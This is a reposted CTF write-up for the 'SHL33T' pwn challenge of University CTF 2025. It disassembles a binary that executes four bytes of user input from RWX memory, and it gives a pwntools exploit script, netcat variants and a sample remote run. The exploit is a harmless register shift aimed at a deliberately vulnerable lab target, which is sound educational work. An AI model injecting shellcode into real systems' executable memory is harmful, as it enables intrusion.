# :locked_with_key: University CTF 2025 Writeup: SHL33T Challenge

> **Original Source:** [University CTF 2025 Writeup: SHL33T Challenge](https://yudhiatmadja.medium.com/university-ctf-2025-writeup-shl33t-challenge-522a0726aa75)
> **Platform:** yudhiatmadja.medium.com | **Category:** `CRYPTO` | **Year:** 2025

---

# University CTF 2025 Writeup: SHL33T Challenge


Category: PWN


Challenge Name: SHL33T

## Challenge Description


The mischievous elves have tampered with Nibbletop’s registers — most notably the EBX register — and now he’s stuck, unable to continue delivering Christmas gifts. Can you step in, restore his register, and save Christmas once again for everyone?


Files Provided:


- `shl33t` - 64-bit ELF executable

- `flag.txt` - Fake flag for local testing

## Initial Analysis


## Binary Protection Check


```
checksec --file=shl33t
```


Results:


```
RELRO STACK CANARY NX PIE
Full RELRO Canary found NX enabled PIE enabled
```


All modern protections are enabled:


- Full RELRO: GOT cannot be overwritten

- Stack Canary: Buffer overflow protection

- NX enabled: Stack is not executable

- PIE enabled: Address Space Layout Randomization

- Architecture: x86–64 (64-bit)


Running the Binary


```
./shl33t
```


Output:


```
[ASCII Art of Christmas Tree]

[Nibbletop] These elves are playing with me again, look at this mess: ebx = 0x00001337

[Nibbletop] It should be ebx = 0x13370000 instead!

[Nibbletop] Please fix it kind human! SHLeet the registers!

$
```


The program clearly tells us:


- Current EBX value: `0x00001337`

- Target EBX value: `0x13370000`

- Hint: “SHLeet” → SHL (Shift Left instruction)

## Reverse Engineering


## Static Analysis with Radare2


```
r2 -AA ./shl33t
[0x00001260]> afl # List all functions
[0x00001260]> pdf @main # Disassemble main function
```


Key Functions Found


```
0x00001521 sym.fail - Called when EBX check fails
0x0000169e sym.success - Called when EBX check succeeds
0x000018fc sym.banner - Displays ASCII art
0x00001349 sym.printstr - Prints strings with animation
0x0000194c sym.handler - Signal handler
0x00001988 main - Main function
```


## Critical Code Analysis in `main`


- Setting EBX to 0x1337 (main+73):


```
0x000019d1 mov $0x1337,%ebx
```


2. Creating Executable Memory:


```
0x00001a12 mov $0x0,%r9d ; offset = 0
0x00001a18 mov $0xffffffff,%r8d ; fd = -1 (anonymous mapping)
0x00001a1e mov $0x22,%ecx ; MAP_PRIVATE | MAP_ANONYMOUS
0x00001a23 mov $0x7,%edx ; PROT_READ | PROT_WRITE | PROT_EXEC
0x00001a28 mov $0x1000,%esi ; length = 4096 bytes
0x00001a2d mov $0x0,%edi ; addr = NULL
0x00001a32 call mmap@plt ; Allocate RWX memory
```


The program allocates 4096 bytes of RWX (Read-Write-Execute) memory. This is the key vulnerability.


3. Reading User Input (4 bytes):


```
0x00001a5b mov -0x30(%rbp),%rax ; Get mmap'd buffer address
0x00001a5f mov $0x4,%edx ; Read exactly 4 bytes
0x00001a64 mov %rax,%rsi ; Destination buffer
0x00001a67 mov $0x0,%edi ; File descriptor = stdin
0x00001a6c call read@plt ; Read input
```


4. Executing Our Shellcode:


```
0x00001a9a mov -0x30(%rbp),%rax ; Load shellcode address
0x00001a9e mov %rax,-0x20(%rbp)
0x00001aa2 mov -0x20(%rbp),%rax
0x00001aa6 call *%rax ; Execute our 4-byte shellcode!
```


After execution, control returns back to main.


5. Checking EBX Value:


```
0x00001aa8 mov %ebx,%eax
0x00001aaa mov %eax,-0x34(%rbp)
0x00001aad cmpl $0x13370000,-0x34(%rbp) ; Check if EBX == 0x13370000
0x00001ab4 jne 0x1af2 <main+362> ; Jump to fail if not equal
```


6. Success Path:


```
0x00001ab6 lea 0x1463(%rip),%rax ; Load success message
0x00001abd mov %rax,%rdi
0x00001ac5 call sym.success ; Print success message
0x00001aca lea 0x1488(%rip),%rax ; "cat flag.txt"
0x00001ad1 mov %rax,%rdi
0x00001ad4 call system@plt ; Execute: system("cat flag.txt")
```


If `EBX == 0x13370000`, the program executes `system("cat flag.txt")` and prints the flag!

## Solution Strategy


## Understanding the Transformation


We need to transform the EBX register:


```
From: 0x00001337
To: 0x13370000
```


Binary Analysis


```
0x00001337 in binary:
0000 0000 0000 0000 0001 0011 0011 0111

0x13370000 in binary:
0001 0011 0011 0111 0000 0000 0000 0000
```


Observation: The value `0x1337` is moved 16 bits to the left!

## Mathematical Solution


```
0x1337 << 16 = 0x13370000
```


This is a left shift by 16 bits operation.

## Assembly Instruction


In x86–64 assembly, we use the `SHL` (Shift Left) instruction:


```
shl ebx, 16 ; Shift EBX left by 16 bits (0x10 in hex)
ret ; Return to caller (main function)
```


## Opcode Generation


Using `pwntools` or an assembler:


- `shl ebx, 16` → Opcode: `C1 E3 10`

- `ret` → Opcode: `C3`


Complete shellcode: `C1 E3 10 C3` (4 bytes total - perfect!)

## Exploitation


## Full Exploit Script


```
#!/usr/bin/env python3
from pwn import *

# Configuration
binary_path = './shl33t'
elf = ELF(binary_path)
context.binary = elf
context.arch = 'amd64'
context.log_level = 'info'

def exploit_local():
"""Local exploitation for testing"""
print("[*] Starting local exploit...")
p = process(binary_path)
p.recvuntil(b'$ ')

shellcode = asm('shl ebx, 16; ret')
print(f"[+] Shellcode: {shellcode.hex()}")

p.send(shellcode)
output = p.recvall(timeout=3)
print(output.decode())
p.close()

def exploit_remote(host, port):
"""Remote exploitation"""
print(f"[*] Connecting to {host}:{port}")

try:
p = remote(host, port)
print("[*] Waiting for prompt...")
p.recvuntil(b'$ ', timeout=10)

# Generate shellcode: shl ebx, 16; ret
shellcode = asm('shl ebx, 16; ret')

print(f"[+] Sending shellcode: {shellcode.hex()}")
print(f"[+] Shellcode bytes: {' '.join(f'{b:02x}' for b in shellcode)}")
print(f"[+] Shellcode length: {len(shellcode)} bytes")

# Send shellcode
p.send(shellcode)

# Receive output
print("[*] Waiting for response...")
output = p.recvall(timeout=5)

print("\n" + "="*60)
print("SERVER RESPONSE:")
print("="*60)
print(output.decode(errors='ignore'))
print("="*60)

if b'HTB{' in output:
print("\n[+] SUCCESS! Flag captured!")
else:
print("\n[-] No flag found in output")

except EOFError:
print("[-] Connection closed by remote server")
except Exception as e:
print(f"[-] Error: {e}")
import traceback
traceback.print_exc()
finally:
try:
p.close()
except:
pass

def main():
print("="*60)
print("CTF PWN Solver: SHL33T Challenge")
print("University CTF 2025: Tinsel Trouble")
print("="*60)
print("\nChallenge Analysis:")
print("- Current EBX: 0x00001337")
print("- Target EBX: 0x13370000")
print("- Operation: 0x1337 << 16 = 0x13370000")
print("- Instruction: shl ebx, 16")
print("- Shellcode: C1 E3 10 C3")
print("="*60)

if args.REMOTE:
host = args.HOST if args.HOST else input("[?] Enter remote host: ")
port = int(args.PORT) if args.PORT else int(input("[?] Enter remote port: "))
exploit_remote(host, port)
else:
print("\n[!] Running LOCAL exploit (fake flag)")
print("[!] For real flag, use: python3 solve.py REMOTE HOST=<ip> PORT=<port>")
print()
exploit_local()

if __name__ == "__main__":
main()
```


## Running the Exploit


For local testing:


```
python3 solve.py
```


For remote server:


```
python3 solve.py REMOTE HOST=<target_ip> PORT=<target_port>
```


Example Execution


```
$ python3 solve.py REMOTE HOST=154.57.164.72 PORT=30921

============================================================
CTF PWN Solver: SHL33T Challenge
University CTF 2025: Tinsel Trouble
============================================================

Challenge Analysis:
- Current EBX: 0x00001337
- Target EBX: 0x13370000
- Operation: 0x1337 << 16 = 0x13370000
- Instruction: shl ebx, 16
- Shellcode: C1 E3 10 C3
============================================================

[*] Connecting to 154.57.164.72:30921
[+] Opening connection to 154.57.164.72 on port 30921: Done
[*] Waiting for prompt...
[+] Sending shellcode: c1e310c3
[+] Shellcode bytes: c1 e3 10 c3
[+] Shellcode length: 4 bytes
[*] Waiting for response...
[+] Receiving all data: Done (XX KB)
[*] Closed connection to 154.57.164.72 port 30921

============================================================
SERVER RESPONSE:
============================================================
HOORAY! You saved Christmas again!! Here is your prize:
HTB{[REDACTED]}
============================================================

[+] SUCCESS! Flag captured!
```


## Alternative Solutions


## Method 1: Manual with netcat


```
# Create shellcode file
echo -ne '\xc1\xe3\x10\xc3' > shellcode.bin

# Send to server
cat shellcode.bin - | nc <host> <port>
```


Method 2: One-liner with pwntools


```
python3 -c "from pwn import *; p=remote('host',port); p.recvuntil(b'$ '); p.send(asm('shl ebx,16;ret')); print(p.recvall().decode())"
```


Method 3: Using raw bytes


```
from pwn import *
p = remote('host', port)
p.recvuntil(b'$ ')
p.send(b'\xc1\xe3\x10\xc3') # Direct opcode bytes
print(p.recvall().decode())
```


## Key Takeaways


## 1. Challenge Name as Hint


The name “SHLeet” is a wordplay on “sheet” and directly hints at the SHL (Shift Left) x86 instruction needed to solve the challenge.

## 2. Intended Vulnerability


Despite all security protections (PIE, NX, Stack Canary, Full RELRO), the program intentionally:


- Creates RWX (executable) memory with `mmap`

- Allows us to inject arbitrary code

- Executes our code and checks the result


This is an intended vulnerability for educational purposes.

## 3. Why Traditional Exploits Don’t Work


- Stack Canary: Prevents classic buffer overflows

- NX (No Execute): Stack isn’t executable, but we get RWX memory from `mmap`

- PIE: ASLR doesn’t matter since we’re not jumping to specific addresses

- Full RELRO: GOT overwrites are impossible

## 4. Register Manipulation


Understanding how CPU registers work and how to manipulate them with minimal shellcode (only 4 bytes!) is crucial for this challenge.

## 5. Opcode Knowledge


Knowing x86–64 opcodes or being able to generate them with tools like `pwntools` is essential for shellcode-based challenges.

## x86–64 Assembly Reference


## SHL Instruction


Syntax:


```
shl destination, count
```


Example:


```
shl ebx, 16 ; Shift EBX left by 16 bits
```


Opcode: `C1 E3 10`


- `C1` - SHL instruction prefix

- `E3` - ModR/M byte (specifies EBX register)

- `10` - Immediate value (0x10 = 16 decimal)

## RET Instruction


Syntax:


```
ret
```


Opcode: `C3`


Returns control to the calling function by popping the return address from the stack and jumping to it.

---

*Originally published on [Medium](https://yudhiatmadja.medium.com/university-ctf-2025-writeup-shl33t-challenge-522a0726aa75). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of crypto CTF writeups.*
